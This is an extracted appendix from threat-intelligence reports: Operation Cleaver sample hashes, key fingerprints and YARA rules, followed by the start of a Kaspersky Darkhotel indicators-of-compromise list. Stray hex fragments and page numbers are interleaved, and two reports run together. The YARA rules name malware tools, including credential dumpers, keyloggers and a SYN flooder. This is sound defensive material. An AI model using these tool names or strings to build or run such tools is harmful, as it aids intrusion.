77
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Samples ( MD5 ) cont .
9a48bee62c41c0640e9564cc37f718bf
9bcb8091ba414a38bfb7a39eccf3f6bc
9e00a52caec6385e0ab1e21e9794a5b0
9ef9ec11c9f83dde38556feaf88b2a29
9feee6fe54ee4ec859f7bad0d798ac4e
ad94daecadbac8a54e81a69cacc41441
ad99db10c0c12eaea09b39568a761b52
adf77661a409b5a1304d08b62a1264f5
af58d803b2e0b5d0f194c25ff85a8d81
afdfafb2c1e2af1a48e833da8f35bb83
b163fcda16d8fe860a906f768ef27bc8
b2d78ecce135e008adc3e80915f69798
b3d5e1ff7a7ff10cd738b215f92d1ad5
b7ddb09bdc0d0eb39c364d9b9d6436cc
baa76a571329cdc4d7e98c398d80450c
bd9fbbbd7dab62ed6a56d00f21c4c67e
be6273ebd472a2a499a6c1e48ae81112
be741520f13a2bf8bc064a73e146bf08
bfc59f1f442686af73704eff6c0226f0
c1b5464c0506bea6cf778dd18fa456cc
c440ec0a8cf7341b746160a684c51741
c5282f088b90de1ab758424b152d34ac
c91887d861d9bd4a5872249b641bc9f9
cb52f84d462ac67bde53eec40128408c
cbe05db979444589211e830487df7610
d000071a6bf49da390fef8f12aa9e3f8
d84c3d678f269a0c6beb22ed266efac0
de56ca66423fc5e42808445f2b5631d3
de56ca66423fc5e42808445f2b5631d3
de744bcb7c63b035b6c5c3ec0279c3ac
e0f6c5fdde04fbf8cd1a42f75cb06248
e4c9e8f28894e89d6270ad6a4c6cd064
e4e5f1efe44ac06bc3672fd1d8f85630
e5428bcae8b4e84cb5186ad5c83ffc98
e7428dec7deb041692d6575e069c1cf0
e8b1f23616f9d8493e8a1bf0ca0f512a
e8ea10d5cde2e8661e9512fb684c4c98
eac61634da4513a10b596e6c8c299126
eb48c318e8fd9a2a7a18da6578db05d6
f1301bad6da06f436e3a3de0244848e1
f3d80d813dc6a239d921169c57c5789d
fa7c9a78eda0f3bb9ff8ec827d5bc9ff
78
# OPCLEAVER
Samples ( SHA-256 )
039ce41fb40a27a46c43bf7ef7d1b08cd5e3f6d71ec08e140cd9166247e783af
0510efd8eae869cd0773a033d5a46d6b7f0162174019e54618887f3085312fcb
064e47074342a6e026de068adaf48c41b2ec2c341c7514768cb7b39425905524
08065f658d65773e583e9ca784148117d87be3a5005a0871cbc4446f42ed5040
0ce968ea8cffb6312f6d17af9044a14f79d6427b9038bcfc6212acb5aa23e74b
0d1f479842cd5bde4f18ab8c85a099da39e13a4051a7c21334e33d55b6f18d76
0fee562cd821f53e864e02b00a59780aed63abca9f7502678fca9bf47b8b12bd
10647c4e7b1b741aeaea9b16d8eb5dae3237ce00dc69f6843790767a277b6204
10cf7a186897243363278cf0283a1687749d9ba43fa713b9f974050f56e97cca
15121b7cbd15143fc0118e06ebe70b7dc1e239b21d865b2c750ed8a0f1f00ef2
1578a4c641f0c7913cdf08267d1a88ac384d586c453b922670be380b7e67a179
1698d8168e860c3377646b12444d38a2e6aebba5a499504a5fc0a73b91d89407
f20476 f64
1756ba79cd63458a50df86203380824ea855c8d6bf1c673e05a13a62f14cd170
6
4
1aa25a930e8bae5abbe75907c335c7d1d875b60f72f02855a8d37daadc6b469f
4
20
1efad3bce90ac1d2011ba686f1ab0e435b9a709763fb238dbcad0f44acddccbe
20dddd8651a26161139b49dfabfb3b4b743c57fcc982afc11d1c5c4264a2a8be
c
2a13730f8f16e04cece490eee53bbdcc9bd1e01fbbc2a758562a6462d9473742
c2
2db6f74a8aef9fe86aef5dff3334e8dd252ac45e26b4a12e8641a770bbb08b45
04576696
2e32c6c9179750df7f1ab35536f09c6b09c73faccea7325fe5c79b5087f5dd6f
32aa8f19e452a1471640cd7be72f806e1997fd5a1a2b2743898ee4cd0aed0dc5
37af3f3b3c43690a2e73d4b5edb968896ec4da7b2c21b12a94e146a10f07fef8
39ba1710545fc9e123abbbce61bda1b00525e59346570a3f8c36f7adde5bb47e
3a7ebd7f502fd3f6b3b88693b1123147621b4030c21df9e0690864e8969e149a
3bdbf591fa0d81606929fdf6abe44ba6e185dd8fc0fa62ade8afde48f704d11a
3d18e18ae97045cc3198026ddc681e7d957a25402b79141a3c6fdc18bb879ad6
2
3fa302449da1e4fad81143cc48fc80034cbc41804f00e00ac17bdb7dba0b992d
b
42ca980b7fc7892716a923c7bf3ff6a76ce81f81bd0a83bea40a1735f33b36b8
e6
45a2ea5226c1ce11e8955c99d5b58fd3baa66fb53436be63cb099e96ef30db43
6
48437fe7d7d0c5fbde340e1392662f7fc421fc05d7c9824f71160475105ad999
9
4f131095ba56f6d3621a007985ac758d780b0c837f554f6e44d535ed55d33af1
86
508c7691d535102538aaa6dce32d750c2492dada36506a390c1959f261a0244b
546
50d11ad32eb72b128185a0aecf39be8085b6b1a8f30cb41d8bc177a1ff8f3067
550a33353730579a7d2b9276cc3b66ca252a59e198285c732fcda46513351c03
5ac9f4e25ef4002274496e18ea537b4c582a3acf3126cc1830a63941d9c91e64
5d1e81f5a4fca25b7afb18eb906c9a53965d81dcf62f9d91499baf03229a8de8
5fb4ae33cac8b2b74e63fc639eeb969a660ef9a7e8310c2769acc925122f047e
616a25378f70474bcb3ad0fad2f1383009c5b7b3cea937be2a5234a110d64b78
634685e43e9f73343cb337ec64a8679485e1ddb4c2de5ecb6a5746aa5ddb1b72
6474f74340e7199919e7532c6756cf459cd20c3391852d80b058eb7997a31e9f
650f143ac0a668536b6750a628ec51e7ca28f5520105eeb87308f557cd74e63c
65509837e15b6a914b611c2d5066ba06ded39b0bed288552e65df20610e35976
79
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
Samples ( SHA-256 ) cont .
65509837e15b6a914b611c2d5066ba06ded39b0bed288552e65df20610e35976
67a2b9c32653161fafaea231b6661d9d797bb0964c79c9ee46cf2bf76571ed45
6888723e56f2e7696ac1e1910f68a1d54d7c76e9eb8e69554980b04e881e0e86
7199acca3d851889efa4a5a42b3f55010f4916294201ce5ad20c76898200ffa9
75b77606175ee696395f1b0e6850d5cd6596e34f74804b30c9bf9e368ebcd299
7890a726603edcd70b6e6f3de367cf891131d833d14c506b26e07935a715048f
79ca080a152bd44f9b07af0f940c303e45e10d516633384f5b3d34a29d0d03c8
7b9fd4b9b36cf84fcbcb3e9bf589d8a51c2166558baf462ab312929fbb584642
80ed4e7a242ee3d1c2656affb04cd56e7262e5a6bf2bec2f8435aa3f47c9b5d1
8129345ce66643d880a3e01e607399279dec7bf9cadc06d9b26134f6d205ed06
8813bd0b4ad6c6155b571c9c1fbcabfeed3812ab8fbd9acd8372385094aaa565
8f02dfd900760cb2c84e4f5a859512f5d719daae063a719c956cbf6185004da5
8f9a45ba73c67ba9c4958ea49508c350a0e1c3caf476ccab2fb8cb3049e3ba46
902f2391b1075e14985bc91316c98cdcf3442ecaeb3ef12422813f946ab8409e
9801f7c552cbcf8c413dade920b96be2eaad9624ba4adaf17f80f815dac58974
9aec3f14ec69e9942a7d3075bb5479dc5fa61e6c2a03cbee1a9269264efac51c
9ba06cb9dcd05e6866ee0e9ecc0c9a480d5b6c8d177ef1907d7fcc02e2871806
9ebbd300ddf70bccbecfe3bf47898e5959cfc090cef8716e2e638d840a24007b
a321158d7f5be572ac5536ad57cb4a312bea52430b03da9dda97f4548a080bc3
aa23c55bed562cbf47c84092d0a35b0da35e3db3982a18a28fb45ca70ac6b399
aa7ac2a053ceba819fcd1c8b273db64296c2754a8101291870e142519c416b1b
abb0ebd57cf2b0d54cd2b01fd9b11ccd9ed68053174d131922811a9ad22459ea
ac272bd9701c5d9cb7e8d1a4e2a191a894e98aa463fb17628c52da16612627d8
ad06e03fdd9eff480ca623ea23ec87c794d99ae6dda308c979fa5173b2b8a514
ad5fbf8e381d92225aa6c022e2bbc175be0e33138b5fa4bbb508b970b33bbc1e
ad71283aadb2455f7a1cd4e8283c789599c33d328da44965f6c282f2e600e1b2
aebac79b820891510b9e14ef97892875bf4197797ca91aef149acdc1e6bf6a7c
af8deedc78097c387926bb95ebd6ab2a870349794f452f35f84132b0dbe12e09
b18f80a02d45eaed618993447c82916ad8802e552dddccf733a3698794d8cb9d
b275caf4cbc4f47b3d772886172438b81a2e11ff5a8683be488de4b219b39070
b42ef5f39aaf6e52ff4e0510b6e5c3fb5c84bf35befcde8bcc18dc86bccbdfb4
b49706b7d5432a368070ee58aa8776cce1ddc2098e863b1b7b36d7b7d79fe6a9
b4d4c421bc70e5a3345d4b8c9d1090ff16ff82870bd38216bb8bac7f1088dafb
b99cddd428e78ede109c7bd3683c374ac6010a15c0633939511e39c1ed99f621
bb2b135c7a9b366ec7090404761a9ee9e7c03c56d68165a6789a29e804104068
be4cc2d1504002107a77bb943ad2d22c205cdcc6ad4804c0440970e5e922d30d
bf7746d29330b666d82b153989d41406305572b92f6b24a1f1adef6374b58328
bfa66edd0d9ae2c8179893ee881f479b37dce0ce8220a8a18e1b42a879ddff4a
c11a244cba9da30173ff1dcb755a377c3b2b1f99cd15a887041937b086113ebd
c1c1e5b43b1ac9af79aafa59a6062468142afc2278b6fea0bb4dbbb83af65d06
80
# OPCLEAVER
Samples ( SHA-256 ) cont .
c30a2fe22050dcac30616a3d27d5c92ea2815d060b365747984913758a209aaa
c74df42cfc7c7221f7f28c67bd726a1caad8453fc35daddfb094aaeede2e8e1e
c9010e060de6a83c3802ed4e6b7f544e6eb2b5420ee2be5c71646e6a27182bea
c901d84878f50a93ab76f2ea31763bebb0acf0c0f9ad86b3abf98e5cde499332
c99fa90038cec60d9aa21a49e537ad9ea55672ed78cf5b429cb4c75ebc5ccd69
c9fc8133e755c14cb02872ba05a2332baefe5e94797479aded46c3db83a7cc14
ca7138bfe08b480386653072482e58f6c48b05a1e7fb8a82cc042806eae9acc2
caa769a21bf97987de4cc92874eaa03e7b0538082c502606aa8ca97823e2e2aa
cd75664edea18e3aa303763e6f6c639b3e90ead4b51c2b3e41c808e3d968c848
cffba2a145d91bdecfa8cb32af6964576889faa04591b503a58507cf89ab7cae
d045ea925cf461da5c58cc2af8a0f96ec7c961ea62ffcf1de0b04abf9b0fa8ac
20476 f64
d11b504b18bc8615e98f3c37d98c6fe11216a0f070a056414ca4407fc298fbd6
6f
d3c2488d321ca6760986fc1a55a3c1db3f7b215fc2883d7e4fabc2871b5a27ac
4
4
d4e54c1bc1efba20d75861c01bb2cc053b1ab9fadae29bf6c4c04528110056e6
20
d5d1fa5b5474089e59c05ca88a96257d4449d852b429c620aa773408bd48d067
d8c7aef47bac024188d929e749e90ac172fd51b8f6e16dec4b6635dc2ffa85ef
c
c2
dc21a2189f9e2d63872c0b5ee7ec75316799c60eb018ba9b98398b69efe45365
dc22e4b5ef752d3ec47d7bb3de7534e4a2daa2642de8c9839ad262d33a7aa7dc
04576696
e180f933aad709883acde441ee64407d49fa4183ae5130480005a0e81a0de491
e250bce96e5f0c162dbe4d87a1a7d65deb910f59c0bea1140897c22eb9dca501
e2e9d60c76225db77668440ff698eacef48b544ffab1ae0c641dcedb5ad570bd
e339c7b77113f1a1c4c2f7e307b785cc4fc9145663fe3a612079240efcc9ac93
e3b38627d9e94a7e084e12cbd2acf7e66ce90021972061f8b9b61316eddb3bd6
e401340020688cdd0f5051b7553815eee6bc04a5a962900883f1b3676bf1de53
e4d43cd20d4ea59f68c26d46c30e1819cac5b9552d27fce826b0855494018267
b2
e509843b2c061fa5e6ea7d11554bb22f36e6b79b7cd5cc0639ff63d48ce66336
6
ed85c3f8d2cccbb6a0ec2b4b27b158b4dbc6885245081901dd51eb2266f4b2bf
e
ee33dd17802ca906fcc68815ff2a7d12ac7fab7f1c272a56444e4fd6715a6227
6
eea0dcabaabef075081e23fc91b84e07042117bb0362e59f11b17338108d0c1b
9
6
f7e1a74e08c5718de9edc57facc26dda97ae5b723420a06ef56f1f6f8aa6fb5a
8
fbc531e83359310e2940ffff180a26e28d55396710c748e2ae7e64357273a09d
546
fd4a9af7ba67f794a83a720539666e89f288686a432b5c7133033a2ebde266cc
Public / Private Key Fingerprints
0A : E1:AE:85:6A : BB : D5:87:BF:8E:21:4E:92:E6:1F:8C
70:70:2F:11:2B:01:03:4A:70:D9:5E:11:CC : E9:7A:16
6F : DB : BB : BA : DA:7F : FA:4B:3F : A1:C3:46:5E:4B:8F:31:E8:31:F1:EC
78:BE:02:06:B3:1E:57:DF:62:4E:30:16:ED : AA:5C:56:F7:E8:11:62
81
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
YARA Signatures
rule BackDoorLogger
{
strings :
$ s1 = “ BackDoorLogger ”
$ s2 = “ zhuAddress ”
condition :
all of them
}
rule Jasus
{
strings :
$ s1 = “ pcap_dump_open ”
$ s2 = “ Resolving IPs to poison ... ”
$ s3 = “ WARNNING : Gateway IP can not be found ”
condition :
all of them
}
rule LoggerModule
{
strings :
$ s1 = “ % s-%02d%02d%02d%02d%02d.r ”
$ s2 = “ C:\\Users\\%s\\AppData\\Cookies\\ ”
condition :
all of them
}
rule NetC
{
strings :
$ s1 = “ NetC.exe ” wide
$ s2 = “ Net Service ”
condition :
all of them
}
rule ShellCreator2
{
strings :
$ s1 = “ ShellCreator2.Properties ”
$ s2 = “ set_IV ”
condition :
all of them
}
82
# OPCLEAVER
YARA Signatures ( cont . )
rule SmartCopy2
{
strings :
$ s1 = “ SmartCopy2.Properties ”
$ s2 = “ ZhuFrameWork ”
condition :
all of them
}
rule SynFlooder
{
strings :
$ s1 = “ Unable to resolve [ % s ] . ErrorCode % d ”
6f20476 f64
$ s2 = “ your target ’s IP is : % s ”
$ s3 = “ Raw TCP Socket Created successfully . ”
condition :
44
20
all of them
}
c
c2
rule TinyZBot
{
04576696
strings :
$ s1 = “ NetScp ” wide
$ s2 = “ TinyZBot . Properties . Resources.resources ”
$ s3 = “ Aoao WaterMark ”
$ s4 = “ Run_a_exe ”
$ s5 = “ netscp.exe ”
2
$ s6 = “ get_MainModule_WebReference_DefaultWS ”
b
$ s7 = “ remove_CheckFileMD5Completed ”
6
$ s8 = “ http://tempuri.org/ ”
6e
$ s9 = “ Zhoupin_Cleaver ”
9
condition :                   6
8
( $ s1 and $ s2 ) or ( $ s3 and $ s4 and $ s5 ) or ( $ s6 and $ s7 and $ s8 ) or
$ s9 )                       546
}
rule ZhoupinExploitCrew
{
strings :
$ s1 = “ zhoupin exploit crew ” nocase
$ s2 = “ zhopin exploit crew ” nocase
condition :
1 of them
}
83
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
YARA Signatures ( cont . )
rule antivirusdetector
{
strings :
$ s1 = “ getShadyProcess ”
$ s2 = “ getSystemAntiviruses ”
$ s3 = “ AntiVirusDetector ”
condition :
all of them
}
rule csext
{
strings :
$ s1 = “ COM+ System Extentions ”
$ s2 = “ csext.exe ”
$ s3 = “ COM_Extentions_bin ”
condition :
all of them
}
rule kagent
{
strings :
$ s1 = “ kill command is in last machine , going back ”
$ s2 = “ message data length in B64 : % d Bytes ”
condition :
all of them
}
rule mimikatzWrapper
{
strings :
$ s1 = “ mimikatzWrapper ”
$ s2 = “ get_mimikatz ”
condition :
all of them
}
rule pvz_in
{
strings :
$ s1 = “ LAST_TIME=00/00/0000:00:00PM$ ”
$ s2 = “ if % % ERRORLEVEL%% = = 1 GOTO line ”
condition :
all of them
}
84
# OPCLEAVER
YARA Signatures ( cont . )
rule pvz_out
{
strings :
$ s1 = “ Network Connectivity Module ” wide
$ s2 = “ OSPPSVC ” wide
condition :
all of them
}
rule wndTest
{
strings :
$ s1 = “ [ Alt ] ” wide
$ s2 = “ < < % s > > : ” wide
6f20476 f64
$ s3 = “ Content - Disposition : inline ; comp=%s ; account=%s ; product=%d ; ”
condition :                 44
}
all of them
20
c
c2
rule zhCat
04576696
{
strings :
$ s1 = “ zhCat -l -h -tp 1234 ”
$ s2 = “ ABC ( A Big Company ) ” wide
condition :
all of them
}
rule zhLookUp
2
{
b
strings :
6
$ s1 = “ zhLookUp . Properties ”
e
condition :
96
all of them
}                             86
rule zhmimikatz            546
{
strings :
$ s1 = “ MimikatzRunner ”
$ s2 = “ zhmimikatz ”
condition :
all of them
}
85
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
6f20476f6f64
044
2
2c
6b204576696c
6e
9
86
546
# OPCLEAVER
86

Darkhotel
Indicators
of Compromise
For more information , contact intelreports@kaspersky.com
Version 1.0
November , 2014
Global Research and Analysis Team
2
Contents
Appendix A - related md5s ..................................................................................... 3
Downloaders , injectors , infostealers ............................................................... 3
Appendix B. Fully Qualified Domain Names , Command and Control ................ 12
Appendix C. Code - signing certificates ................................................................ 17
Appendix D. Malcode Technical Notes ............................................................... 58
Small Downloader .......................................................................................... 58
Technical Details ....................................................................................... 58
Information Stealer ......................................................................................... 60
Technical Details ....................................................................................... 60
Trojan . Win32.Karba.e ..................................................................................... 64
Technical Notes ......................................................................................... 64
Selective Infector ............................................................................................ 67
Technical Notes ......................................................................................... 67
Trojan - Dropper & Injector ( infected legitimate files ) ..................................... 67
Technical Notes ......................................................................................... 67
Enhanced Keyloggers and Development ...................................................... 68
Technical Notes ......................................................................................... 68
Keylogger Code ............................................................................................... 68
Appendix E. Parallel and Previous Research ...................................................... 73
TLP : Green 	                           For any inquiries , please contact intelreports@kaspersky.com
3
Appendix A - related md5s
Downloaders , injectors , infostealers
000c907d39924de62b5891f8d0e03116
00ca5c0558dc9eba1a8a4dd639e74899
0183bac55ebfad2850a360d6cd93d941
0396f7af9842dc5c8c0df1a44c01068c
03a611a8c2f84e26c7b089d3f1640687
03d35ef3fdf353fe4dc65f3d11137172
043d308bfda76e35122567cf933e1b2a
04461ee7c724b6805820df79e343aa49
05059c5a5e388e36eed09a9f8093db92
061e3d50125dc78c86302b7cfa7e4935
06206fe97fed0f338fd02cb39ed63174
08a41624e624d8fb26eeed7a3b1f5009
08b04d6ef94d2764bfafd1457eb0d2a0
08e08522066a8cd7b494ca64de46d4f7
091e4364f50addd6c849f4399a771409
09e7b0ecd5530b8e87190dee0f362e13
0bd1677c0691c8a3c7327bf93b0a9e59
0bfbd26a1a6e3349606d37a8ece04627
0bfc8e7fa0b026a8bf51bbea3d766890
0cbd04c5432b6bfb29921177749f3015
0d75157d3f7fbf13264df3f8a18b3905
0fe3daf9e8b69255e592c8af97d24649
101244381e0590adecf5f2b18d1b6042
11e85a6e127802204561b6996d4224b6
121a9ea93f3ed16a1b191187b16b7592
12b88e36170472413a49ae71b1ac9a33
12df4869b3a885d71c8e871f1a1b0fde
1300244219cb756df01536692edebdbb
131c5f8e98605f9d8074ca02fd1b9c34
131c625a92dc721c5d4dae3fb65591fc
140b27db7d156d6a63281e1f6fc6075d
15097b11e3898cb0be995e44a79431f2
151115ddf1cd4b474a9106cfebcb82e4
16139ce9025274a388a4281fef65049e
16e378d5f0a15fbd521b087c0951a2ab
173abb95e39f03415cd95b76e8a2f58f
TLP : Green 	        For any inquiries , please contact intelreports@kaspersky.com
4
1743dafa776677e232d20506858d9a4e
175aa0d1bdebfa60de29b90ab2c62189
178f7fe2d3a2bda46c0e78f679ca5a62
18527b303c0afe91f5ae86d34b52eb29
18527b303c0afe91f5ae86d34b52eb29
1971ee25847d246116835c7157cf7f89
1a2e52e5ac18cfe091bb3ac1cb38f050
1b0c2c6c19404112306a78ecf366f90b
1ec49ae6d535bfb3789d498f4fd0224f
1ee6676e122fcd22e80b6ae0dc40c979
1ef21e634f9779280710e87ff17a83af
1f29ec5ab8a7c2ccda21576f29cbb13b
1fcaa239cf4d627078179f6de299f320
2024679f61cf9ab60342eca58360737f
216088053dac46fcd95938568c469fa6
21792583ab4a7080ceaf2c31731b883e
21ba9d9d914d8140c1e34030e84213f4
236df260f858f9a6ca056bcdec6f754f
25102d64dbc9b6495c5713f3178dd7f1
26b34d3df337407c7618f74e9a82eb9f
26b7b5d019d7500efdb866f1d20d2000
275e0786b6294ffd05f45df435df842c
27db26077f849e26ba89fcafd2f0db92
27f2f32ba938b1747f28ffdd2f56c691
2802c47b48cced7f1f027f3b278d6bb3
28b1569109fcae8cfcdcfbe9c4431b66
2aac9d340620da09d96929ba570978c4
2b443cc331fec486a6ccbcfcd92e76a4
2be3a8dd0059e291022ad32bbce0e5d1
31e0788c9c2e16db1ae1002f0dbc837e
3260c9f881eb815b7ef3f5f295fc5174
326b44e73fccece89326fd865da61f7f
35a15355c96be225507ebed1ec434d57
378177ddc1fd7d213b79c033da26327d
38b919f37501fc3d54f8f1b956448a92
3961CAB50C32E8F32FE45836B9715CE5
3961cab50c32e8f32fe45836b9715ce5
39fc4a3ea44ab9822ed5e77808803727
3f39c6dea5311167cc7ff62befd4ea7e
41b816289a6a639f7f2a72b6c9e6a695
TLP : Green 	        For any inquiries , please contact intelreports@kaspersky.com
5
41b816289a6a639f7f2a72b6c9e6a695
428eb3305d4d4c9a8831e1d54160ed65
42a3bb917778454fa96034ad4fb17832
42b9fea2ec56a90cefeecee3c84aade0
436b853cbc87ba3a99131ce2d64a512d
44300d48fccd5aaf27f4c863421c0d47
44e520bec8a3e35f6f6ad52e97911e14
45a4c8c01ec94e1db83b86e05dc9e851
45b94e90cab94d9f873478151a80703d
48888cca68db492c87892524146e8ae3
4d275adbd318f182fa0ec0275cf217b4
4d840625c5ca9a4f1cbd35d4b1ca2452
4f377a8344baa76afe9103ca843e315f
4fc1b3dbf9dc44278f990d57913d96f6
50ac685d25033962e04adc92c8e70785
51c1b9b3df00de5e08c4aa3a2b864a54
51d3e2bd306495de50bfd0f2f4e19ae9
51eaec282b845bc54dbd4fbce5bb09d8
522cd120fa4b1517a60fcf8be3e71ff4
53dc9866fd77fe4933eea3c08666c7bb
55b125da1310d2b37f18ea4e2ae8192b
5607a3ccdaf748fd5cd2d1bec4a771bd
57099403f28d2ce79cba11469c8be971
57dfd2ec5401d9a3d68b4d125e1eb308
5b7b8d3b844b4dbc22875a2a6866a862
5bbdb09ec6ec333a20de74fd430b2bc2
5dee5ad9f12f89fcf9fdcf07ebab3e5e
5f05acd53cfd91fb4dba3660ad1e3add
60af79fb0bd2c9f33375035609c931cb
63409ddbd5316bae8e956595c81121ab
65460ec31dce97c456991ba5215d9c43
686738eb5bb8027c524303751117e8a9
687b8d2112f25e330820143ede7fedce
68ca3d3fc4901d1af8d3adc3170af6ad
697e77c5ef4cf91d5a84b0b3f0617887
6a37ba1bac5fb990fbd1c34effcb0b9d
6bb1a12416c92f5ef12947e2dc5748f9
6ce73a81f0e4a41ffcf669e6ace29db6
6de1b481ae52fbacd7db84789a081b74
6f1a828a2490099a3ce9f873823cce7c
TLP : Green 	        For any inquiries , please contact intelreports@kaspersky.com
6
70a0412d19d55bcab72e76c984694215
72869fc63d0ba875dfc539d2bcd48e4d
74d403244db05f7c294ca0777a9f7a9e
76dd289fa3dd8f36972593a006b771cc
77669d11c3248a6553d3c15cd1d8a60e
7bab3a69ab65b90e47d5cc0724531914
7c2eeda3bb66b2c29aa425ba74c780c3
7d304a9cdcda75b1cb9537618f5ed398
804dceb3fa2b9bcf65595109b9465bbc
82ab0b8246c6677f9866b17794b72e2d
864cd4a59215a7db2740dfbe4a648053
86b18e99072ba72d5d36bce9a00fc052
89de19ff50dd58eda2b136b65feb3fb0
8c01d9a2c13ebc8dc32956336a6bc4f5
8f7a7d003cafa56c63e9402f553f9521
90f26c5c4b3c592352fcbddf41dc18aa
910a1f150a5de21f377cf771ed53261f
912a8c7cf1ad78cd4543bfb594c7db58
9a2f2291686080a29f4c68bdc530887f
9bc355cbb5473f4f248f3e2be028ec0b
9c5cd8f4a5988acae6c2e2dce563446a
9ccc7ce97f8ee0cd44d607e688b99eca
9eeae870f22350694eb2e7a4852dbb7d
9f08b8182c987181fe3f3906f7463eac
a44577e8c77ef3c30749fe6ec2bb55a5
a49780f2da2067dd904135fad3af8a90
a71f240abb41eb1e37ff240613d14277
a7b226c220e1282320fca291a5100f93
a8151939085ce837b3a7deec58efa7b4
a9faa01c7cf7150054600fc2ab63e4b6
aaeb3b0651720a3f37a0c2f57c92429c
abdcde9cd1f9135e412f7bb0a9cafbc9
ad0f9ba1a355c5e8048c476736c90217
af26f60a80171c4337117133f1c2ba5f
b07f6065011621c569fc2decd27056df
b1048d7d2464f27a19b2adbf310158b1
b2b29dcb1251c8b1c380f00834297857
b4cbafc20d19b06a4ab670129a3ae5aa
b6428851df75dc91bb46583b97d9a566
b7d1c3a03e92b24e9052e75ea381ea4a
TLP : Green 	         For any inquiries , please contact intelreports@kaspersky.com
7
ba87428a298f8acf258b2f4f814bd9b9
be7acfaf90c8fab44393345704dd2b69
bf700fa187cc22d591e1ec4e7442145a
c12fe91f0c39c2460ea304ffc250918d
c322e499729291451437d46c6f05b920
c49e6114fa3de4f823010e852d891896
c4ac4924544877cd100e53f1115c7df9
c5a9ec966196a03e53fd1869764d8507
c6cbb4ea6aabf4a58659cd13fa0b024f
c82ca00476d7e8532d055bf2cc2c9d59
c9f95fc8219750b7c47325a0b84e9373
cdd5afba31e91706412ba58fff2b4d31
cf95ab8c4cc222088de00dbb20374d69
d580cab0c05dd78215fd6252934c240f
d96babbde694df227a9af4b4b61483b3
da608f216594653a1716edd5734cd6e1
da6c390915639c853612cb665ac635f4
da6ed3cc582b4424c96b8ca73aaeb8ad
dd555740dcabb3dab3ea1fc71273e493
e070293d03cd3524e5db9fa4770589a5
e2ed43a6bbb72c927a4e083768e47254
e271ba345eada5f56471c5413acf52f9
e2b5c47156508a31b74a1f48e814fbe7
e579157fb503b5cbd59ce66f5381575c
e5a31be7717c12a3cf9a173428ac7c38
e62af1303ed81f1ae69a1c3b1f215d88
e65fddac2ada261adcdcde87b4dc5540
e9f89d406e32ca88c32ac22852c25841
ec4be1af573e5c55023b35bd02efe394
ed2119548aff161ff97d6837e6a08e84
ed9f539ddabdab8a88491ee38f638b64
ede6a67f7956686f753819c46f496c84
f1368a2e56ae66587847a1655265d3c9
f2231ce84551fbd8a57e75fb07d7f6c0
f47cdf5bfc7227382e18f8361249212b
f5d745e7a575b7aecae302623acd6277
f602fe96deb8615ab8cefbd959e1d438
f7084cf91278eb8176c815ec4e269851
f97ec1cc844914a9aa8dfa00d1ead62e
fe7efa9f0417ba001c058b513518f4cf
TLP : Green 	         For any inquiries , please contact intelreports@kaspersky.com
8
a6f55037cb02911c5624e70a67704156
a131d12bc9ab7983b984c81e5e7e108e
0367f890595cf28c6c195dfabae53ba5
adab033d420206fcd2503643d443956e
cbbfa76cd5ed22a8c53f7f7d117923e5
93283599dbf3b2d47872dafae12afb21
d8137ded710d83e2339a97ee78494c34
93283599dbf3b2d47872dafae12afb21
06ac12b8c51aec71cefcf8a507d82ce4
3165b7472a9dd45cde49538561cba59f
043f0dcea6f6fbd1305571e6bf0fa78c
17c99725043fa1573fd650e57c3c75d3
0393036f35a7102a34fadfd77680b292
01cbd90ba5cf7e9595b208e4ca2d2d15
032a7c67332a3abf6da179ed265e6e04
23f7fe611ed2bd814bbdbfae457150b3
Example md5s of files detected with Kaspersky ’s Virus . Win32.Pioneer.dx and
Symantec ’s Infostealer . Nemim!inf :
00d8dd7ec8545134bdc2527b4190078b
01d09407d09355a821ba23ffb58ec40d
033d922f3f56f9ea7c976f31107e366a
043c84cef3e011e3dc731d643a205f4e
058efdf7d94c5da920a3c32cbadac2d0
0b6caacd4081d3b18e847a40c1b6a7f3
0b727001dfc90cc354bd2ccabe3c23a5
0d3e3fd44faa32e0d83b02c8b7cff49c
0d48f948b3c47d0c08e8ee026b8f4670
0fb91846ab9a4e9667c81154829f888b
1d399370e82b314ba20c21ff4ee82205
1f9d915d331f7e363c39108f41145c44
2431db868ebec1b967f5ad38abfd95c4
255f7842c6f07a6a1500a30fb4d27d54
35994a29128c08bed6f5d4aad28f102b
268d17f3763246ac27de7dc8024f23fa
40591b4ba82e0347b33098f6652640d6
4286ee45e9fcc2db3ddfad38426b7f50
4a0fa9be43cc84b5beb0b484227edfcb
4ce790e8438ed3a644984eb24452dd42
4e01e648645d041d52af9dbb09e442ef
TLP : Green 	              For any inquiries , please contact intelreports@kaspersky.com
9
4e8ea6bfacf9766f25af12fd63b16ce9
56217179283737f5c46c0a64ebe28a82
5cb91f0c3a1452176007dcc594ec02ce
5f05b4aff89a07dbac9914ae3cf1314f
611c4440aa2587f54702e7e58b7be75f
65f7b330bcc7aeebf8d84afa0b23bf02
67b96c2265e44ccfad708c9387570ab4
69fa0bfd74d0db4ad734b9944ea71ec3
6a79c842a6edca3460b0026cd16c3670
6acd47c45a3e031411af351b3be5f82e
6d3839c312976ba96e89ab6a243aef8f
6f7ec5ff103e4ee038a54816c6b9bc09
720af0fa1f2633b1b73c278a0a016559
729a2f6c7e95075ff36947bc5811a5d3
752c351778a8a18245f132dafdc54599
7a5256dda43cb459e99c0073f1e8f07b
7ad3b74bec51678622e21f57fb82e136
7f608ebfb9b1c81cb07eb8f26fd7647a
83f0f16fb86d6f67ca158d66c195884e
873f26caddfe1e9af18181d8f5f18368
8cdd3b6c577a17b698333337dd1cf3e0
8def236d23dea950d9b1b222cb9a463a
9305008e17b0805118a6a9bb45493441
965e7d4785d23ba6b6608c1245586eba
98b07144f4f5cc95348b39d6bfaeb56a
9978ced410a7dfd3a21ff59cbe1e4303
99a2cca89d044148aa3379cdf2e899fa
9a56bb6c022b3a2ab40d2b308ddf7015
9ba119cf7107d6f4f910447c90c4985d
9c3b06ab28840239cf1d0ecf4a45f6f4
9cdbd5955fc3bf6da5c00e0804b6d6a8
9d248e5cc726f2aa2fa4f06566a2d5b8
9eae89f27c8fbc5896fc7e540e4cfd4a
a07db3237b6bd9789b5f1126ea7b0195
a1467e57ea55030e45325d3987db9fca
a6b0406dff68430aac6a5b738731e7d0
